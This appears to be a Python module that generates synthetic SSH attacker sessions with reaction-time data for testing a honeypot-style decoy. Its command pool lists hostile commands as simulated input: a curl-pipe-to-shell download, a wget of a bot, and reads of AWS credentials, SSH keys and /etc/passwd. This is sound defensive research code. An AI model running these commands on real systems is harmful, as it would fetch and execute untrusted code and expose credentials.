"""Synthetic attacker telemetry for benchmarks, tests and demos.

The sessions follow the live decoy's layout (src/schedule.py): regimes switch at the live command
indices, the `regime` of a row is the one applied to the response to its own command, and its
`delta_t_ns` is the attacker's reaction to the response to the previous command. An archetype's
reaction times are therefore defined per regime *of the response reacted to*. Command 0 has no
preceding response, so its delta_t is 0.
"""
import numpy as np
import pandas as pd

from src.schedule import regime_at, reaction_regime


def generate_synthetic_data(num_sessions=10, script_type="A", num_cmds=50):
    """
    Generates synthetic session telemetry.
    Script A (Fast Botnet): Very small delta_t_ns, highly impatient.
    Script B (Scanner): Medium, constant delta_t_ns, ignores delays.
    """
    rows = []

    for i in range(num_sessions):
        session_id = f"session_{script_type}_{i:03d}"
        source_ip = f"10.0.{1 if script_type == 'A' else 2}.{i}"

        for cmd_idx in range(num_cmds):
            regime = regime_at(cmd_idx)
            reacted_to = reaction_regime(cmd_idx)

            dt = 0
            if cmd_idx > 0:
                if script_type == "A":
                    # Impatient - reacts heavily to slowdowns
                    if reacted_to == "baseline": dt = 1_000_000  # 1ms
                    elif reacted_to == "slowdown": dt = 100_000_000  # 100ms
                    elif reacted_to == "jitter": dt = np.random.randint(50, 200) * 1_000_000
                    elif reacted_to == "fs_latency": dt = 200_000_000
                else:
                    # Script B - Constant slow scan, doesn't care
                    dt = 500_000_000  # 500ms fixed

            cmd = "ls -la" if cmd_idx % 2 == 0 else "cat /etc/passwd"
            if script_type == "B":
                cmd = "wget http://example.com/bot" if cmd_idx % 2 == 0 else "chmod +x bot"

            rows.append({
                "session_id": session_id,
                "timestamp_ns": 1000 + dt,
                "source_ip": source_ip,
                "protocol": "SSH",
                "command_index": cmd_idx,
                "command_raw": cmd,
                "command_root": cmd.split()[0],
                "current_path": "/home",
                "regime": regime,
                "delta_t_ns": dt,
                "response_sent": True
            })
    return pd.DataFrame(rows)


REGIMES = ["baseline", "slowdown", "jitter", "fs_latency"]
COMMAND_POOL = [
    "ls -la", "cat /etc/passwd", "uname -a", "whoami", "id", "ps aux", "ifconfig",
    "wget http://example.com/bot", "curl -s http://198.51.100.7/x.sh | sh", "chmod +x bot",
    "rm -rf /tmp/.x", "echo $(hostname) > /tmp/h", "cat ~/.aws/credentials", "cd /var/www",
    "touch /tmp/.lock", "netstat -an", "crontab -l", "find / -name id_rsa",
]


def random_family(rng: np.random.Generator) -> dict:
    """A random attacker archetype: reaction time per regime reacted to, timing noise, command habits."""
    return {
        "median_dt": {r: float(np.exp(rng.uniform(np.log(1e6), np.log(1e9)))) for r in REGIMES},
        "noise": float(rng.uniform(0.0, 0.5)),
        "commands": list(rng.choice(COMMAND_POOL, size=int(rng.integers(2, 5)), replace=False)),
    }


def generate_family_sessions(family: dict, num_sessions: int, rng: np.random.Generator,
                             family_id: str = "F", min_cmds: int = 15, max_cmds: int = 60) -> pd.DataFrame:
    """Sessions of one archetype with variable length and multiplicative timing noise."""
    rows = []
    for i in range(num_sessions):
        session_id = f"session_{family_id}_{i:03d}"
        cmds = family["commands"]
        for cmd_idx in range(int(rng.integers(min_cmds, max_cmds + 1))):
            regime = regime_at(cmd_idx)
            reacted_to = reaction_regime(cmd_idx)
            dt = 0 if reacted_to is None else int(family["median_dt"][reacted_to] * np.exp(rng.normal(0, family["noise"])))
            cmd = cmds[cmd_idx % len(cmds)]
            rows.append({
                "session_id": session_id, "timestamp_ns": 1000 + dt, "source_ip": f"10.9.0.{i}",
                "protocol": "SSH", "command_index": cmd_idx, "command_raw": cmd,
                "command_root": cmd.split()[0], "current_path": "/home", "regime": regime,
                "delta_t_ns": dt, "response_sent": True,
            })
    return pd.DataFrame(rows)
